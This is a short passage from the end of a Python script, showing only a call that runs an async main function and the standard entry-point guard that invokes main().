    asyncio.run(async_main(args))


if __name__ == "__main__":
    main()
